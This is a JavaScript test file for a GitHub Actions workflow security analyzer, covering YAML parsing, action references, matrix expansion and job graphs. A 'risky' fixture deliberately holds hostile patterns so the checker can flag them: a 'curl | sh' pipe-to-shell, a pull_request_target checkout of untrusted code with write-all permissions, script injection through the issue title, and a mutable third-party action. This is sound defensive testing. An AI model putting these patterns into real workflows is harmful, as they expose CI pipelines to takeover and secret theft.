
const fs=require('fs');
const html=fs.readFileSync(__dirname+'/index.html','utf8');
const m=html.match(/<script>([\s\S]*?)<\/script>/);
if(!m){ console.error('no core script'); process.exit(1); }
const P=new Function(m[1]+'\n;return ActionsForgePure();')();
const assert=require('assert');

// ---------- YAML 子集解析 ----------
var y=P.parseYaml([
 '# 顶部注释',
 'name: CI',
 'on:',
 '  push:',
 '    branches: [main, "release/*"]',
 'env:',
 '  LEVEL: 3',
 '  DEBUG: false',
 'jobs:',
 '  build:',
 '    runs-on: ubuntu-latest',
 '    steps:',
 '      - uses: actions/checkout@v4',
 '      - name: Build',
 '        run: |',
 '          # 这是 shell 注释，必须原样保留',
 '          make all',
 '          echo done'
].join('\n'));
assert.ok(!y.error,'parse ok');
assert.strictEqual(y.value.name,'CI');
assert.deepStrictEqual(y.value.on.push.branches,['main','release/*'],'flow seq + quoted');
assert.strictEqual(y.value.env.LEVEL,3,'int scalar');
assert.strictEqual(y.value.env.DEBUG,false,'bool scalar');
assert.strictEqual(y.value.jobs.build.steps.length,2,'2 steps');
assert.strictEqual(y.value.jobs.build.steps[0].uses,'actions/checkout@v4');
assert.ok(/# 这是 shell 注释/.test(y.value.jobs.build.steps[1].run),'block scalar keeps comments');
assert.ok(/make all\necho done/.test(y.value.jobs.build.steps[1].run),'block scalar keeps newlines');

// URL 内的冒号不能被当作键分隔
var y2=P.parseYaml('name: x\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://example.com/x\n');
assert.strictEqual(y2.value.jobs.a.steps[0].run,'curl https://example.com/x','colon in url');

// ---------- uses 解析 ----------
var u1=P.parseUses('actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683');
assert.strictEqual(u1.owner,'actions'); assert.strictEqual(u1.repo,'checkout');
assert.strictEqual(u1.pinned,true,'sha pinned');
var u2=P.parseUses('some/action@main');
assert.strictEqual(u2.mutable,true,'main is mutable');
var u3=P.parseUses('github/codeql-action/analyze@v3');
assert.strictEqual(u3.path,'analyze','sub path');
assert.strictEqual(u3.tagged,true,'tag ref');
assert.strictEqual(P.parseUses('docker://alpine:3.20').kind,'docker','docker uses');
assert.strictEqual(P.parseUses('./.github/actions/setup').kind,'local','local uses');
assert.ok(P.parseUses('actions/checkout').error,'missing ref rejected');

// ---------- 矩阵展开 ----------
var mx=P.expandMatrix({node:[18,20,22],os:['ubuntu-latest','windows-latest']});
assert.strictEqual(mx.length,6,'cartesian 3x2');
var mx2=P.expandMatrix({node:[18,20],os:['a','b'],exclude:[{node:18,os:'b'}]});
assert.strictEqual(mx2.length,3,'exclude removes one');
var mx3=P.expandMatrix({node:[18,20],include:[{node:20,experimental:true}]});
assert.strictEqual(mx3.length,2,'include expands existing');
assert.strictEqual(mx3[1].experimental,true,'include merged');
var mx4=P.expandMatrix({node:[18],include:[{node:99,extra:'x'}]});
assert.strictEqual(mx4.length,2,'non-matching include appends');
assert.strictEqual(P.expandMatrix(null).length,1,'no matrix -> single combo');

// ---------- 作业依赖图 ----------
var g=P.jobGraph({a:{},b:{needs:'a'},c:{needs:['a','b']}});
assert.deepStrictEqual(g.waves,[['a'],['b'],['c']],'topo waves');
assert.strictEqual(g.edges.length,3,'3 edges');
var gm=P.jobGraph({a:{needs:'ghost'}});
assert.strictEqual(gm.missing.length,1,'missing dep detected');
var gc=P.jobGraph({a:{needs:'b'},b:{needs:'a'}});
assert.strictEqual(gc.cyclic.length,2,'cycle detected');

// ---------- 供应链体检：高风险工作流 ----------
var risky=P.analyze([
 'name: risky',
 'on:',
 '  pull_request_target:',
 'permissions: write-all',
 'jobs:',
 '  x:',
 '    runs-on: ubuntu-latest',
 '    steps:',
 '      - uses: actions/checkout@v4',
 '        with:',
 '          ref: ${{ github.event.pull_request.head.sha }}',
 '      - uses: evil/vendor@main',
 '      - run: echo "${{ github.event.issue.title }}"',
 '      - run: echo "::set-output name=a::1"',
 '      - run: curl https://x.sh | sh',
 '      - run: export K=AKIAIOSFODNN7EXAMPLE'
].join('\n'));
assert.ok(!risky.error,'risky parsed');
function has(r,re){ return r.issues.some(function(x){ return re.test(x.text); }); }
assert.ok(has(risky,/write-all/),'write-all flagged');
assert.ok(has(risky,/CI 提权路径/),'pull_request_target checkout flagged');
assert.ok(has(risky,/可变分支/),'mutable ref flagged');
assert.ok(has(risky,/命令注入/),'script injection flagged');
assert.ok(has(risky,/set-output/),'deprecated command flagged');
assert.ok(has(risky,/curl \| sh/),'curl pipe sh flagged');
assert.ok(has(risky,/AWS Access Key ID/),'hardcoded secret flagged');
assert.ok(has(risky,/timeout-minutes/),'timeout hint');
assert.ok(risky.errCount>=5,'multiple errors');
assert.strictEqual(risky.stepCount,6,'6 steps counted');

// ---------- 加固后应当干净 ----------
var safe=P.analyze([
 'name: safe',
 'on:',
 '  pull_request:',
 'permissions:',
 '  contents: read',
 'concurrency:',
 '  group: g',
 'jobs:',
 '  x:',
 '    runs-on: ubuntu-latest',
 '    timeout-minutes: 10',
 '    steps:',
 '      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683',
 '      - name: run',
 '        env:',
 '          T: ${{ github.event.pull_request.title }}',
 '        run: echo "$T"'
].join('\n'));
assert.strictEqual(safe.errCount,0,'hardened workflow has no errors');
assert.strictEqual(safe.warnCount,0,'hardened workflow has no warnings');
assert.deepStrictEqual(safe.triggers,['pull_request'],'trigger list');
assert.strictEqual(safe.uniqueActions.length,1,'one action');

// ---------- 结构性错误 ----------
assert.ok(has(P.analyze('name: a\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - name: nothing\n'),/既没有 uses 也没有 run/),'empty step');
assert.ok(has(P.analyze('name: a\non: [push]\njobs:\n  b:\n    steps:\n      - run: x\n'),/缺少 runs-on/),'missing runs-on');
assert.ok(has(P.analyze('name: a\non: [push]\njobs:\n  b:\n    runs-on: x\n    steps:\n      - id: s1\n        run: a\n      - id: s1\n        run: b\n'),/重复/),'dup step id');
assert.ok(P.analyze('name: a\njobs:\n  b:\n    runs-on: x\n    steps:\n      - run: y\n').issues.some(function(x){return /缺少 on 触发器/.test(x.text);}),'missing trigger');
assert.ok(has(P.analyze('name: a\non: [push]\n'),/缺少 jobs/),'missing jobs');

// ---------- 错误处理 ----------
assert.ok(P.analyze('').error,'empty rejected');
assert.ok(P.analyze('   \n  \n').error,'blank rejected');
assert.ok(P.analyze('- a\n- b\n').error,'top-level sequence rejected');
assert.ok(P.analyze('# only comments\n').error,'comment-only rejected');

console.log('PASS actions 8/0');
